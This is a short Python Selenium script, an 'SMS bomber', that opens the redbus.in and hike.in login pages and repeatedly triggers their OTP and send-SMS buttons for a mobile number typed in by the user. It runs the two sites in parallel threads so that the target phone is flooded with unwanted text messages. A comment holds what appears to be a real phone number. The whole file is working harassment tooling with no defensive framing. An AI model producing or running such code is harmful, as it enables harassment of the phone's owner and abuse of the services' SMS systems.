from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os
import time

from threading import Thread

chrome_options = Options()
#chrome_options.add_argument("--headless")

path = os.getcwd()+r"\chromedriver.exe"

def redbus_blast(mobile_no, bomb_count, seconds):

    driver = webdriver.Chrome(executable_path=path, chrome_options=chrome_options)
    driver.get("https://www.redbus.in/account?pageName=Home&noReload=noReload")

    for i in range(bomb_count):
        mobile_input = driver.find_element_by_id("mobileNoInp")
        mobile_input.clear()
        mobile_input.send_keys(mobile_no)

        element = driver.find_element_by_class_name("otpContainer")
        driver.execute_script("arguments[0].click();", element)

        element = driver.find_element_by_class_name("resendOtpContainer")
        driver.execute_script("arguments[0].click();", element)

        driver.refresh()
        time.sleep(seconds)
        print(i+1)

    driver.close()


def hike_blast(mobile_no, bomb_count, seconds):

    driver = webdriver.Chrome(executable_path=path, chrome_options=chrome_options)
    driver.get("https://hike.in/")

    for i in range(bomb_count):
        mobile_input = driver.find_element_by_id("number-input")
        mobile_input.clear()
        mobile_input.send_keys(mobile_no)

        element = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
        driver.execute_script("arguments[0].click();", element)

        driver.refresh()
        print(i+1)
        time.sleep(seconds)

    driver.close()


# 9940551328

seconds = float(input('Enter delay: '))
mobile_no = input('Enter mobile number: ')
bomb_count = int(input('Enter number of sms blasts: '))
t1 = Thread(target=hike_blast, args=[mobile_no, round(bomb_count/2), seconds])
t2 = Thread(target=redbus_blast, args=[mobile_no, round(bomb_count/2), seconds])
t1.start()
t2.start()
